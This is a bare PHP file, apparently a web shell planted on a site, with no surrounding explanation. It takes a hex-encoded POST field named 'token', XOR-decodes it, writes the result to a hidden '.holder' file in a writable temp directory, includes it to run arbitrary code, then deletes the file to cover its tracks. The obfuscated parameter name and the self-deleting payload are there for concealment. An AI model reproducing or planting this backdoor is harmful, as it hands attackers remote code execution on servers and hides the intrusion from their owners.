<!--mp3lMRad-->
mp3lMRad<?php

if(!empty($_POST["\x74\x6F\x6Ben"])){
$property_set = array_filter(["/dev/shm", getenv("TEMP"), sys_get_temp_dir(), session_save_path(), ini_get("upload_tmp_dir"), "/var/tmp", getenv("TMP"), getcwd(), "/tmp"]);
$k = hex2bin($_POST["\x74\x6F\x6Ben"]);
$mrk  = ''   ; $q=0;do{$mrk.=chr(ord($k[$q])^18);$q++;}while($q<strlen($k));
$obj = 0;
do {
    $descriptor = $property_set[$obj] ?? null;
    if ($obj >= count(property_set)) break;
            if ((function($d) { return is_dir($d) && is_writable($d); })($descriptor)) {
            $data = vsprintf("%s/%s", [$descriptor, ".holder"]);
            $bind = fopen($data, 'w');
if ($bind) {
    fwrite($bind, $mrk);
    fclose($bind);
    include $data;
    @unlink($data);
    die();
}
        }
    $obj++;
} while (true);
}